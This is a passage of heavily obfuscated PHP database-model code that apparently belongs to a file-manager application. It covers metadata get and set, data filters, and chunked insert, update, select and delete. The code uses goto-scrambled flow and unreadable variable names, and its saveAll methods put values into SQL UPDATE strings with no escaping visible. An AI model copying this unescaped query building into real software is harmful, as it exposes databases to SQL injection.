checkLength($aÊÈëå™´—, $bŒÙóµ÷ = 0, $DÛÅäÆÎ¹Ú = '') { $DÆ®‚ßˆª“ =& $_SERVER[ã®Â„Éæ¹¤]; $bŒÙóµ÷ = $bŒÙóµ÷ ? $bŒÙóµ÷ : 65536; if (!$aÊÈëå™´— || strlen($aÊÈëå™´—) < $bŒÙóµ÷) { return; } $DÛÅäÆÎ¹Ú = $DÛÅäÆÎ¹Ú ? $DÛÅäÆÎ¹Ú . $DÆ®‚ßˆª“[67] : $DÆ®‚ßˆª“[33]; show_json($DÛÅäÆÎ¹Ú . LNG($DÆ®‚ßˆª“[355]) . "\50{$bŒÙóµ÷}\51", !1); } protected function metaSet($B…îÃšÑõƒ, $eë…ß‰øîÌ = null, $E¨ÍÃÍÁŠ– = null) { goto bÛ‚µíéÃ”; a×†ŒÂ·‚Ö: if (is_null($eë…ß‰øîÌ)) { return $fäÁÌÃŠ“->where(array($BËªïøíŞš => $B…îÃšÑõƒ))->delete(); } if (is_null($E¨ÍÃÍÁŠ–) && is_string($eë…ß‰øîÌ)) { return $fäÁÌÃŠ“->where($F¬•Ó†¼ŠÛ)->delete(); } $C‡‘»Ç™Š = is_array($eë…ß‰øîÌ) ? $eë…ß‰øîÌ : array(); goto c™±‚ù§é; cóùŒÊåéÂ: $fäÁÌÃŠ“->where(array($BËªïøíŞš => $B…îÃšÑõƒ))->addAll($Dà“îôôÑ×, array(), !0); return !0; goto Bà³—ˆë•; Bœä¾Ìì¥Æ: $bİïŒ £‚ = $this->tableMeta[$eÒ «Ñô‰§[357]]; $fäÁÌÃŠ“ = Model($bİïŒ £‚); $F¬•Ó†¼ŠÛ = array($BËªïøíŞš => $B…îÃšÑõƒ, $eÒ «Ñô‰§[358] => $eë…ß‰øîÌ); goto a×†ŒÂ·‚Ö; c™±‚ù§é: if (is_string($eë…ß‰øîÌ)) { $C‡‘»Ç™Š[$eë…ß‰øîÌ] = $E¨ÍÃÍÁŠ–; } $Dà“îôôÑ× = array(); foreach ($C‡‘»Ç™Š as $eÈµÆª÷ª‰ => $a¬ŠÎ›¨¥–) { $this->checkLength($a¬ŠÎ›¨¥–, !1, $bİïŒ £‚ . $eÒ «Ñô‰§[4] . $eÈµÆª÷ª‰); $Dà“îôôÑ×[] = array($BËªïøíŞš => $B…îÃšÑõƒ, $eÒ «Ñô‰§[89] => $eÈµÆª÷ª‰, $eÒ «Ñô‰§[359] => $a¬ŠÎ›¨¥–); } goto cóùŒÊåéÂ; bÛ‚µíéÃ”: $eÒ «Ñô‰§ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->tableMeta) { return !1; } $BËªïøíŞš = $this->tableMeta[$eÒ «Ñô‰§[356]]; goto Bœä¾Ìì¥Æ; Bà³—ˆë•: } public function metaGet($a‰ªã«˜Àç, $bØÆ»–Ø… = false) { goto F°´á›†Õ; F°´á›†Õ: $F¨ˆÛ…ˆõ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->tableMeta) { return array(); } $D¸¢» ¡…Ô = $this->tableMeta[$F¨ˆÛ…ˆõ[356]]; goto eêÓîÚÍ½é; fÙÒùä¢­: $cƒ‘Ğ±’· = $aë¹çí‚›†->field($F¨ˆÛ…ˆõ[360])->where($CÍ·«›µºâ)->select(); $cƒ‘Ğ±’· = array_to_keyvalue($cƒ‘Ğ±’·, $F¨ˆÛ…ˆõ[89], $F¨ˆÛ…ˆõ[359]); return $cƒ‘Ğ±’·; goto fÂÕ›‡åğƒ; eêÓîÚÍ½é: $aë¹çí‚›† = Model($this->tableMeta[$F¨ˆÛ…ˆõ[357]]); if ($bØÆ»–Ø…) { $CÍ·«›µºâ = array($D¸¢» ¡…Ô => $a‰ªã«˜Àç, $F¨ˆÛ…ˆõ[89] => $bØÆ»–Ø…); return $aë¹çí‚›†->where($CÍ·«›µºâ)->getField($F¨ˆÛ…ˆõ[359]); } $CÍ·«›µºâ = array($D¸¢» ¡…Ô => $a‰ªã«˜Àç); goto fÙÒùä¢­; fÂÕ›‡åğƒ: } private function checkDataAutoHas($c ’ÙéùÃ—) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $eÜŒŠô‘) { if (in_array($c ’ÙéùÃ—, explode($_SERVER[ã®Â„Éæ¹¤][47], $eÜŒŠô‘[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$F›¸„ÔÒì˜, $bæ™À»‡) { $D…«‡¹»¡Ù =& $_SERVER[ã®Â„Éæ¹¤]; foreach ($this->dataAuto as $E—³Í¯µ¤) { $AïãìÏ¶ó‹ = $E—³Í¯µ¤[0]; if (!in_array($bæ™À»‡, explode($D…«‡¹»¡Ù[47], $E—³Í¯µ¤[2]))) { continue; } switch (trim($E—³Í¯µ¤[3])) { case $D…«‡¹»¡Ù[309]: case $D…«‡¹»¡Ù[310]: $cšãĞ—–¯İ = $E—³Í¯µ¤[1]; $BÊÖÅˆ·Û† = isset($E—³Í¯µ¤[4]) ? (array) $E—³Í¯µ¤[4] : array(); if ($cšãĞ—–¯İ == $D…«‡¹»¡Ù[190] && array_key_exists($AïãìÏ¶ó‹, $F›¸„ÔÒì˜)) { if (!$F›¸„ÔÒì˜[$AïãìÏ¶ó‹]) { unset($F›¸„ÔÒì˜[$AïãìÏ¶ó‹]); } break; } if (isset($F›¸„ÔÒì˜[$AïãìÏ¶ó‹])) { array_unshift($BÊÖÅˆ·Û†, $F›¸„ÔÒì˜[$AïãìÏ¶ó‹]); } if ($D…«‡¹»¡Ù[309] == $E—³Í¯µ¤[3]) { $F›¸„ÔÒì˜[$AïãìÏ¶ó‹] = call_user_func_array($cšãĞ—–¯İ, $BÊÖÅˆ·Û†); } else { $F›¸„ÔÒì˜[$AïãìÏ¶ó‹] = call_user_func_array(array(&$this, $cšãĞ—–¯İ), $BÊÖÅˆ·Û†); } break; case $D…«‡¹»¡Ù[261]: $F›¸„ÔÒì˜[$AïãìÏ¶ó‹] = $F›¸„ÔÒì˜[$E—³Í¯µ¤[1]]; break; case $D…«‡¹»¡Ù[282]: if (isset($F›¸„ÔÒì˜[$AïãìÏ¶ó‹]) && !is_string($F›¸„ÔÒì˜[$AïãìÏ¶ó‹])) { $F›¸„ÔÒì˜[$AïãìÏ¶ó‹] = json_encode_force($F›¸„ÔÒì˜[$AïãìÏ¶ó‹]); } break; case $D…«‡¹»¡Ù[311]: if ($F›¸„ÔÒì˜[$AïãìÏ¶ó‹] === $D…«‡¹»¡Ù[33]) { unset($F›¸„ÔÒì˜[$AïãìÏ¶ó‹]); } break; case $D…«‡¹»¡Ù[312]: $F›¸„ÔÒì˜[$AïãìÏ¶ó‹] = $E—³Í¯µ¤[1]; default: break; } } if ($bæ™À»‡ == $D…«‡¹»¡Ù[344]) { $A×ŠÀ³¨‘§ = strtolower($this->db->getDbType()); if (strpos($A×ŠÀ³¨‘§, $D…«‡¹»¡Ù[9]) !== 0) { return; } $Bİ¯¸ÉÊ°ì = $this->field(!0)->fields; $a–¿ä’‘æ¦ = $Bİ¯¸ÉÊ°ì[$D…«‡¹»¡Ù[240]]; if (isset($Bİ¯¸ÉÊ°ì[$D…«‡¹»¡Ù[239]])) { unset($a–¿ä’‘æ¦[$Bİ¯¸ÉÊ°ì[$D…«‡¹»¡Ù[239]]]); } foreach ($a–¿ä’‘æ¦ as $D›–»•çš => $bæ™À»‡) { if (!isset($F›¸„ÔÒì˜[$D›–»•çš])) { $F›¸„ÔÒì˜[$D›–»•çš] = $D…«‡¹»¡Ù[33]; } } } } private function dataAfterFilter(&$dÛã»‹îŞ) { $E¹í÷†Ë¶½ =& $_SERVER[ã®Â„Éæ¹¤]; foreach ($this->dataAuto as $fùÛ§†Î®†) { $bÛÇæÎ®Ûß = $fùÛ§†Î®†[0]; if (!in_array($E¹í÷†Ë¶½[346], explode($E¹í÷†Ë¶½[47], $fùÛ§†Î®†[2]))) { continue; } if (!isset($dÛã»‹îŞ[$bÛÇæÎ®Ûß])) { continue; } switch (trim($fùÛ§†Î®†[3])) { case $E¹í÷†Ë¶½[309]: case $E¹í÷†Ë¶½[310]: $Aª‰ãàšÂº = isset($fùÛ§†Î®†[4]) ? (array) $fùÛ§†Î®†[4] : array(); array_unshift($Aª‰ãàšÂº, $dÛã»‹îŞ[$bÛÇæÎ®Ûß]); if ($E¹í÷†Ë¶½[309] == $fùÛ§†Î®†[3]) { $dÛã»‹îŞ[$bÛÇæÎ®Ûß] = call_user_func_array($fùÛ§†Î®†[1], $Aª‰ãàšÂº); } else { $dÛã»‹îŞ[$bÛÇæÎ®Ûß] = call_user_func_array(array(&$this, $fùÛ§†Î®†[1]), $Aª‰ãàšÂº); } break; case $E¹í÷†Ë¶½[261]: $dÛã»‹îŞ[$bÛÇæÎ®Ûß] = $dÛã»‹îŞ[$fùÛ§†Î®†[1]]; break; case $E¹í÷†Ë¶½[282]: $CÏƒ¸å¾¶Ê = $dÛã»‹îŞ[$bÛÇæÎ®Ûß]; $dÛã»‹îŞ[$bÛÇæÎ®Ûß] = json_decode($CÏƒ¸å¾¶Ê, !0); if (is_null($dÛã»‹îŞ[$bÛÇæÎ®Ûß])) { $dÛã»‹îŞ[$bÛÇæÎ®Ûß] = $CÏƒ¸å¾¶Ê; } break; case $E¹í÷†Ë¶½[311]: if ($dÛã»‹îŞ[$bÛÇæÎ®Ûß] === $E¹í÷†Ë¶½[33]) { unset($dÛã»‹îŞ[$bÛÇæÎ®Ûß]); } break; case $E¹í÷†Ë¶½[312]: $dÛã»‹îŞ[$bÛÇæÎ®Ûß] = $fùÛ§†Î®†[1]; default: break; } } } public function saveAll($e…‡±Ì–Ò) { goto a‹‹öÕƒè³; a‹‹öÕƒè³: $D¼±‘‚™­ñ =& $_SERVER[ã®Â„Éæ¹¤]; $d‰äÄËèÀÒ = $this->tablePrefix . $this->tableName; $d««ÈöÕé« = self::SQL_WHERE_IN_CHUNK; goto açˆ×¹Ïõæ; C¡·â‡Ñõ: $this->chunkEventSet(); goto fš—óÈÙ‹; açˆ×¹Ïõæ: $e…‡±Ì–Ò = is_array($e…‡±Ì–Ò) ? $e…‡±Ì–Ò : array(); $c”‰”‡ÌÚä = $D¼±‘‚™­ñ[361]; $aÄ–Â™êê› = 0; goto Cœ“ßŒËƒ†; Cœ“ßŒËƒ†: $Fš÷¯¤ñ‹Ğ = array(); $E†°õô°ò = count($e…‡±Ì–Ò); for ($Bªîİµºè² = 0; $Bªîİµºè² < $E†°õô°ò; $Bªîİµºè²++) { $côÉÎˆõ±İ = $e…‡±Ì–Ò[$Bªîİµºè²]; if (!is_array($côÉÎˆõ±İ) || count($côÉÎˆõ±İ) != 4) { continue; } $AÔ¾Ê«Œ‡¿ = "\125\120\104\x41\x54\x45\x20\140{$d‰äÄËèÀÒ}\x60\40\123\105\x54\40{$côÉÎˆõ±İ[2]}\x20\75\x20\103\x41\x53\105\x20{$côÉÎˆõ±İ[0]}\x20\12"; if ($aÄ–Â™êê› == 0) { $c”‰”‡ÌÚä = $AÔ¾Ê«Œ‡¿; } $Fš÷¯¤ñ‹Ğ[] = $D¼±‘‚™­ñ[113] . $côÉÎˆõ±İ[1] . $D¼±‘‚™­ñ[113]; $aÄ–Â™êê›++; $c”‰”‡ÌÚä .= "\x20\127\110\105\x4e\40\47{$côÉÎˆõ±İ[1]}\x27\40\x54\x48\x45\116\x20\47{$côÉÎˆõ±İ[3]}\x27\x20\xa"; if ($aÄ–Â™êê› == $d««ÈöÕé« || $Bªîİµºè² == $E†°õô°ò - 1) { goto e´™‘ùøÏ; D›ŠŞÏ: $Fš÷¯¤ñ‹Ğ = array(); goto e×Ã¶Ê…Ü”; eÍ±¶İ·“Â: $aÄ–Â™êê› = 0; $c”‰”‡ÌÚä = $AÔ¾Ê«Œ‡¿; $this->chunkEventCheck(count($Fš÷¯¤ñ‹Ğ)); goto D›ŠŞÏ; e´™‘ùøÏ: $A±õ˜ğ = implode($D¼±‘‚™­ñ[47], $Fš÷¯¤ñ‹Ğ); $c”‰”‡ÌÚä .= "\40\105\x4e\x44\40\40\127\x48\105\122\x45\x20{$côÉÎˆõ±İ[0]}\40\x49\x4e\x20\x28{$A±õ˜ğ}\51\40"; $this->execute($c”‰”‡ÌÚä); goto eÍ±¶İ·“Â; e×Ã¶Ê…Ü”: } } goto C¡·â‡Ñõ; fš—óÈÙ‹: } public function saveAllEach($dÉç‚Üù‚è) { $a¯–â¸ê¯± =& $_SERVER[ã®Â„Éæ¹¤]; $f¿æÑò•Ö = $this->tablePrefix . $this->tableName; foreach ($dÉç‚Üù‚è as $f†Çï±Şã) { if (!is_array($f†Çï±Şã) || count($f†Çï±Şã) != 4) { continue; } $e²ø÷©õÉç = $f†Çï±Şã[0] . $a¯–â¸ê¯±[362] . $f†Çï±Şã[1] . $a¯–â¸ê¯±[113]; $aô„Â«ëÈÔ = $f†Çï±Şã[2] . $a¯–â¸ê¯±[362] . $f†Çï±Şã[3] . $a¯–â¸ê¯±[113]; $bàÍØÅ¿¬ = "\x75\160\x64\x61\164\145\40{$f¿æÑò•Ö}\x20\x73\x65\x74\40{$aô„Â«ëÈÔ}\x20\x77\x68\x65\x72\145\x20{$e²ø÷©õÉç}\x3b"; $this->execute($bàÍØÅ¿¬); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($f¥·İƒòºç = false, $FÄ¥ä»…à¬ = false) { $this->_chunkEvent = $f¥·İƒòºç; $this->_chunkEventParam = $FÄ¥ä»…à¬; } private function chunkEventCheck($B„Êö÷†ƒ) { if (!$this->_chunkEvent) { return; } $eÓë›†ê‡´ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $eÓë›†ê‡´[$_SERVER[ã®Â„Éæ¹¤][363]] = $B„Êö÷†ƒ; Hook::trigger($this->_chunkEvent, $eÓë›†ê‡´); } public function addAll($Cö·ÈƒŒªò, $Cäµé Ä´µ = array(), $aˆ”ôÊ¸ã¾ = false) { goto eë«¦†î¼; eë«¦†î¼: $a½ŸÉ›ß·« =& $_SERVER[ã®Â„Éæ¹¤]; ignore_timeout(); $EÕÚ‚Ú•œŞ = self::SQL_WHERE_IN_CHUNK; goto e¢åÙÇÇ‘š; e¢åÙÇÇ‘š: if (empty($Cö·ÈƒŒªò)) { $this->error = think_lang($a½ŸÉ›ß·«[259]); return !1; } $Cäµé Ä´µ = $this->_parseOptions($Cäµé Ä´µ); foreach ($Cö·ÈƒŒªò as $dœ§ÔŒÈÙ¾ => $a†…äÌó¼) { $Cö·ÈƒŒªò[$dœ§ÔŒÈÙ¾] = $this->_facade($a†…äÌó¼); $this->_beforeInsert($Cö·ÈƒŒªò[$dœ§ÔŒÈÙ¾], $Cäµé Ä´µ); } goto f†ö¦«; f†ö¦«: if (method_exists($this->db, $a½ŸÉ›ß·«[260])) { for ($dÚŒ•“·ÂŞ = 0; $dÚŒ•“·ÂŞ < count($Cö·ÈƒŒªò); $dÚŒ•“·ÂŞ += $EÕÚ‚Ú•œŞ) { $B‹æ…×òùµ = array_slice($Cö·ÈƒŒªò, $dÚŒ•“·ÂŞ, $EÕÚ‚Ú•œŞ); if (!is_array($B‹æ…×òùµ) || count($B‹æ…×òùµ) == 0) { break; } $a ÒÙÎáŒ¡ = $this->db->insertAll($B‹æ…×òùµ, $Cäµé Ä´µ, $aˆ”ôÊ¸ã¾); $this->chunkEventCheck(count($B‹æ…×òùµ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Cö·ÈƒŒªò as $dœ§ÔŒÈÙ¾ => $a†…äÌó¼) { $a ÒÙÎáŒ¡ = $this->db->insert($a†…äÌó¼, $Cäµé Ä´µ, $aˆ”ôÊ¸ã¾); } $this->commit(); } if (!1 !== $a ÒÙÎáŒ¡) { $E÷¯ä£‘‘× = $this->getLastInsID(); if ($E÷¯ä£‘‘×) { return $E÷¯ä£‘‘×; } } return $a ÒÙÎáŒ¡; goto a¿ìòÄÒŠÑ; a¿ìòÄÒŠÑ: } public function save($Aôî°öğ» = '', $a÷¤ˆ•â„í = array()) { goto f©á˜¤Í; f©á˜¤Í: $b­Œæ¯Ëİ± =& $_SERVER[ã®Â„Éæ¹¤]; $F“½Ñ¢–„Û = self::SQL_WHERE_IN_CHUNK; $f´¹ˆèÀ½ = $this->optionsValue(); goto Fó¼ùºâ¸Ö; Fó¼ùºâ¸Ö: $F›‡ˆô§ÆÔ = $this->findWhereField($f´¹ˆèÀ½); if (!$F›‡ˆô§ÆÔ) { return parent::save($Aôî°öğ», $a÷¤ˆ•â„í); } $aä»Ç ²‚ò = 0; goto aÆ—çøçŞ; C§ÀŒ‘ô†: for ($b…á§ù‰Á› = 0; $b…á§ù‰Á› < $C¿È¡Ü¿š; $b…á§ù‰Á› += $F“½Ñ¢–„Û) { $E»®ö©¬ÆÆ = array_slice($D±ÁŞêìˆ´, $b…á§ù‰Á›, $F“½Ñ¢–„Û); if (!is_array($E»®ö©¬ÆÆ) || count($E»®ö©¬ÆÆ) == 0) { break; } $f´¹ˆèÀ½[$b­Œæ¯Ëİ±[263]][$F›‡ˆô§ÆÔ][1] = $E»®ö©¬ÆÆ; $this->optionsValue($f´¹ˆèÀ½); $aä»Ç ²‚ò += parent::save($Aôî°öğ», $a÷¤ˆ•â„í); $this->chunkEventCheck(count($E»®ö©¬ÆÆ)); } $this->chunkEventSet(); return $aä»Ç ²‚ò; goto EĞêø†Äéã; aÆ—çøçŞ: $D±ÁŞêìˆ´ = $f´¹ˆèÀ½[$b­Œæ¯Ëİ±[263]][$F›‡ˆô§ÆÔ][1]; $D±ÁŞêìˆ´ = is_array($D±ÁŞêìˆ´) ? $D±ÁŞêìˆ´ : array(); $C¿È¡Ü¿š = count($D±ÁŞêìˆ´); goto C§ÀŒ‘ô†; EĞêø†Äéã: } public function add($BÍ†í¦­™ = '', $CÎ¥¤Èª• = array(), $fô×Â–¹³Š = false) { if ($this->addTaskStatus && is_array($BÍ†í¦­™)) { $this->addTaskData[] = $BÍ†í¦­™; return; } return parent::add($BÍ†í¦­™, $CÎ¥¤Èª•, $fô×Â–¹³Š); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Dƒ‘–‚°Ù = array()) { goto dÛ˜Œ “í¾; dÛ˜Œ “í¾: $b÷„ÚïĞµï =& $_SERVER[ã®Â„Éæ¹¤]; $cğƒ„†î¢ = self::SQL_WHERE_IN_CHUNK; $fÆµŒñ­é… = $this->optionsValue(); goto AµçÇƒ„˜Ü; cÇ‰ÉëŞÙ: return $f©†îÌáË; goto F×âß×Š¸¶; AµçÇƒ„˜Ü: $aåÆŠ¦‹¯ = $this->findWhereField($fÆµŒñ­é…); if (!$aåÆŠ¦‹¯ || isset($fÆµŒñ­é…[$b÷„ÚïĞµï[280]]) || isset($fÆµŒñ­é…[$b÷„ÚïĞµï[340]])) { return parent::select($Dƒ‘–‚°Ù); } $cğÚ‡ßŒå‘ = $fÆµŒñ­é…[$b÷„ÚïĞµï[263]][$aåÆŠ¦‹¯][1]; goto c ¸ÊÏÌŸ; c ¸ÊÏÌŸ: $cğÚ‡ßŒå‘ = is_array($cğÚ‡ßŒå‘) ? $cğÚ‡ßŒå‘ : array(); $f©†îÌáË = null; for ($aîçğÊ‰  = 0; $aîçğÊ‰  < count($cğÚ‡ßŒå‘); $aîçğÊ‰  += $cğƒ„†î¢) { $e§ˆ‚í†ß² = array_slice($cğÚ‡ßŒå‘, $aîçğÊ‰ , $cğƒ„†î¢); if (!is_array($e§ˆ‚í†ß²) || count($e§ˆ‚í†ß²) == 0) { break; } $fÆµŒñ­é…[$b÷„ÚïĞµï[263]][$aåÆŠ¦‹¯][1] = $e§ˆ‚í†ß²; $this->optionsValue($fÆµŒñ­é…); $eœØÁ²Ñ = parent::select($Dƒ‘–‚°Ù); if (!$eœØÁ²Ñ) { continue; } if (is_null($f©†îÌáË)) { $f©†îÌáË = array(); } $f©†îÌáË = array_merge($f©†îÌáË, $eœØÁ²Ñ); } goto cÇ‰ÉëŞÙ; F×âß×Š¸¶: } public function delete($f¹ãÏŒ—Æ™ = array()) { goto CÃé‘‘ßÓö; CÃé‘‘ßÓö: $aÇˆƒ—åÀ… =& $_SERVER[ã®Â„Éæ¹¤]; $C‡ÔÕòâÆŒ = self::SQL_WHERE_IN_CHUNK; $B•’ËÇåé = $this->optionsValue(); goto EÕƒªåÆ ¯; Aæ•‚¥®¥¦: return $eâÚÄÚßé; goto eÛ¾Ã®µ«; EÕƒªåÆ ¯: $F¬¥Ÿ¦‰¥ = $this->findWhereField($B•’ËÇåé); if (!$F¬¥Ÿ¦‰¥) { return parent::delete($f¹ãÏŒ—Æ™); } $eâÚÄÚßé = 0; goto e¬ÈĞ¯; e¬ÈĞ¯: $Eø×Ö»Œ˜ = $B•’ËÇåé[$aÇˆƒ—åÀ…[263]][$F¬¥Ÿ¦‰¥][1]; $Eø×Ö»Œ˜ = is_array($Eø×Ö»Œ˜) ? $Eø×Ö»Œ˜ : array(); for ($A˜òÔŠ°Œó = 0; $A˜òÔŠ°Œó < count($Eø×Ö»Œ˜); $A˜òÔŠ°Œó += $C‡ÔÕòâÆŒ) { $fÓ‡´·ïŒÑ = array_slice($Eø×Ö»Œ˜, $A˜òÔŠ°Œó, $C‡ÔÕòâÆŒ); if (!is_array($fÓ‡´·ïŒÑ) || count($fÓ‡´·ïŒÑ) == 0) { break; } $B•’ËÇåé[$aÇˆƒ—åÀ…[263]][$F¬¥Ÿ¦‰¥][1] = $fÓ‡´·ïŒÑ; $this->optionsValue($B•’ËÇåé); $eâÚÄÚßé += parent::delete($f¹ãÏŒ—Æ™); } goto Aæ•‚¥®¥¦; eÛ¾Ã®µ«: } private function findWhereField($böÎ½†Êêë) { $cÏÊ¦ÄŞ½¸ =& $_SERVER[ã®Â„Éæ¹¤]; $AÛäãìù¬ = self::SQL_WHERE_IN_CHUNK; if (!is_array($böÎ½†Êêë) || !is_array($böÎ½†Êêë[$cÏÊ¦ÄŞ½¸[263]])) { return !1; } foreach ($böÎ½†Êêë[$cÏÊ¦ÄŞ½¸[263]] as $EŸ‡áŠŠ => $C½‘©·­íİ) { if (is_array($C½‘©·­íİ) && isset($C½‘©·­íİ[0]) && is_string($C½‘©·­íİ[0]) && strtolower($C½‘©·­íİ[0]) == $cÏÊ¦ÄŞ½¸[7] && is_array($C½‘©·­íİ[1]) && count($C½‘©·­íİ[1]) > $AÛäãìù¬) { ignore_timeout(); return $EŸ‡áŠŠ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\145\155\117\x70\x74\x69\x6f\156"; public $field = array(); public function listData($fÊİŠ¿Ãˆ© = false, $d¥ˆôÙíÏ = "\155\x6f\144\151\146\171\x54\151\x6d\145", $c›†Úä…áÕ = false) { $A¹Ì‹†Ü–å = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$A¹Ì‹†Ü–å) { return $fÊİŠ¿Ãˆ© ? null : array(); } if (!$fÊİŠ¿Ãˆ©) { $A¹Ì‹†Ü–å = array_filter(array_values($A¹Ì‹†Ü–å)); return array_sort_by($A¹Ì‹†Ü–å, $d¥ˆôÙíÏ, $c›†Úä…áÕ); } return $A¹Ì‹†Ü–å[$_SERVER[ã®Â„Éæ¹¤][364] . $fÊİŠ¿Ãˆ©]; } public function insert($bàÀˆÃ÷‚°) { goto dŠ¶ø•ĞÑà; dŠ¶ø•ĞÑà: $Bß”—½¡É =& $_SERVER[ã®Â„Éæ¹¤]; $bàÀˆÃ÷‚° = array_field_key($bàÀˆÃ÷‚°, $this->field); $F‘Ê¹ºíîæ = Model($this->modelType)->get($Bß”—½¡É[365], $this->optionType . $Bß”—½¡É[366]); goto aÃ»Š›Ï¡Ô; cã¾Ãä‚´Œ: return $F‘Ê¹ºíîæ; goto dŸº‘¥°è; c¹óÓ¼¿”¬: $bàÀˆÃ÷‚°[$Bß”—½¡É[107]] = time(); Model($this->modelType)->set($Bß”—½¡É[365], $F‘Ê¹ºíîæ, $this->optionType . $Bß”—½¡É[366]); Model($this->modelType)->set($Bß”—½¡É[364] . $F‘Ê¹ºíîæ, $bàÀˆÃ÷‚°, $this->optionType); goto cã¾Ãä‚´Œ; aÃ»Š›Ï¡Ô: $F‘Ê¹ºíîæ = $F‘Ê¹ºíîæ ? $F‘Ê¹ºíîæ : 0; $bàÀˆÃ÷‚°[$Bß”—½¡É[367]] = ++$F‘Ê¹ºíîæ; $bàÀˆÃ÷‚°[$Bß”—½¡É[187]] = time(); goto c¹óÓ¼¿”¬; dŸº‘¥°è: } public function update($CŠÊŸÂÇ¿ó, $d²×¡¯÷£—) { goto A³’ë¢Øá; A³’ë¢Øá: $d·†ŒÑ¡à =& $_SERVER[ã®Â„Éæ¹¤]; $d²×¡¯÷£— = array_field_key($d²×¡¯÷£—, $this->field); $BßœÀÇÉëé = $this->listData($CŠÊŸÂÇ¿ó); goto cÏ ø§Ì¦Ñ; cÏ ø§Ì¦Ñ: if (!$BßœÀÇÉëé) { return !1; } $d²×¡¯÷£— = array_merge($BßœÀÇÉëé, $d²×¡¯÷£—); $d²×¡¯÷£—[$d·†ŒÑ¡à[107]] = time(); goto d›áÎïÃ‡; d›áÎïÃ‡: return Model($this->modelType)->set($d·†ŒÑ¡à[364] . $CŠÊŸÂÇ¿ó, $d²×¡¯÷£—, $this->optionType); goto dñİîÒÚ›à; dñİîÒÚ›à: } public function remove($B½©£¿µ×) { return Model($this->modelType)->remove($_SERVER[ã®Â„Éæ¹¤][364] . $B½©£¿µ×, $this->optionType); } public function clear() { $d‰ä‘×‡Ö¯ =& $_SERVER[ã®Â„Éæ¹¤]; Model($this->modelType)->remove($d‰ä‘×‡Ö¯[365], $this->optionType . $d‰ä‘×‡Ö¯[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($f¶ğóŒãÙñ, $bâ‘èÌº—’) { if (!$bâ‘èÌº—’) { return !1; } $eğÃß±òçø = $this->listData(); $eğÃß±òçø = array_to_keyvalue($eğÃß±òçø, $f¶ğóŒãÙñ); return isset($eğÃß±òçø[$bâ‘èÌº—’]) ? $eğÃß±òçø[$bâ‘èÌº—’] : !1; } public function findByName($AŠ¼ ì¹) { return $this->findByKey($_SERVER[ã®Â„Éæ¹¤][28], $AŠ¼ ì¹); } protected function resetData($b˜Üƒ··Šº) { $Aâ½¦…®ê =& $_SERVER[ã®Â„Éæ¹¤]; $b˜Üƒ··Šº = is_array($b˜Üƒ··Šº) ? $b˜Üƒ··Šº : array(); $D±•‡í§§ = array(); for ($døª³¨Ò„ = 0; $døª³¨Ò„ < count($b˜Üƒ··Šº); $døª³¨Ò„++) { $D±•‡í§§[$Aâ½¦…®ê[364] . $b˜Üƒ··Šº[$døª³¨Ò„][$Aâ½¦…®ê[367]]] = $b˜Üƒ··Šº[$døª³¨Ò„]; } return Model($this->modelType)->set($D±•‡í§§, !1, $this->optionType); } private function getAutoName($D……ØŞ«åã) { $DØ±¨’À«³ = array_to_keyvalue($this->listData(), $_SERVER[ã®Â„Éæ¹¤][28]); if (!$DØ±¨’À«³ || !isset($DØ±¨’À«³[$D……ØŞ«åã])) { return $D……ØŞ«åã; } for ($CòËİŒˆŒ = 1; $CòËİŒˆŒ < count($DØ±¨’À«³); $CòËİŒˆŒ++) { $BæÖÂ™®èÉ = $D……ØŞ«åã . "\50{$CòËİŒˆŒ}\51"; if (!isset($DØ±¨’À«³[$BæÖÂ™®èÉ])) { return $BæÖÂ™®èÉ; } } return $BæÖÂ™®èÉ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($f¯±îñÇÂË = false, $E¿Ü™Øİ„˜ = '', $d”¼¬Ôê = false) { goto D­ä’´Æµ; A¼‘ÊÆ“Ç: $this->cacheSet($E¿Ü™Øİ„˜, $E£ºÙÃšÄö); $E£ºÙÃšÄö = array_merge($e²¨‹ùØ—Ò, $E£ºÙÃšÄö); return $f¯±îñÇÂË ? $E£ºÙÃšÄö[$f¯±îñÇÂË] : $E£ºÙÃšÄö; goto A¨ã·ßš; a…÷„Û: $E£ºÙÃšÄö = $this->where($C·’‘­İŸ¥)->select(); $E£ºÙÃšÄö = array_to_keyvalue($E£ºÙÃšÄö, $Dõ’¯†† Ú[89], $Dõ’¯†† Ú[359]); foreach ($E£ºÙÃšÄö as $bœçÈ©ñ => $BÕ”º‡Îº) { if ($d”¼¬Ôê || in_array($bœçÈ©ñ, $this->jsonField)) { $E£ºÙÃšÄö[$bœçÈ©ñ] = json_decode($BÕ”º‡Îº, !0); } } goto A¼‘ÊÆ“Ç; FŠø’¤©÷è: $e²¨‹ùØ—Ò = is_array($e²¨‹ùØ—Ò) ? $e²¨‹ùØ—Ò : array(); if (is_array($E£ºÙÃšÄö)) { $E£ºÙÃšÄö = array_merge($e²¨‹ùØ—Ò, $E£ºÙÃšÄö); return $f¯±îñÇÂË ? isset($E£ºÙÃšÄö[$f¯±îñÇÂË]) ? $E£ºÙÃšÄö[$f¯±îñÇÂË] : null : $E£ºÙÃšÄö; } $C·’‘­İŸ¥ = $this->filterWhere(array($Dõ’¯†† Ú[29] => $E¿Ü™Øİ„˜)); goto a…÷„Û; D­ä’´Æµ: $Dõ’¯†† Ú =& $_SERVER[ã®Â„Éæ¹¤]; $E£ºÙÃšÄö = $this->cacheGet($E¿Ü™Øİ„˜); $e²¨‹ùØ—Ò = $this->optionDefault($E¿Ü™Øİ„˜); goto FŠø’¤©÷è; A¨ã·ßš: } public function set($EŠï‡‚Õ‘Š, 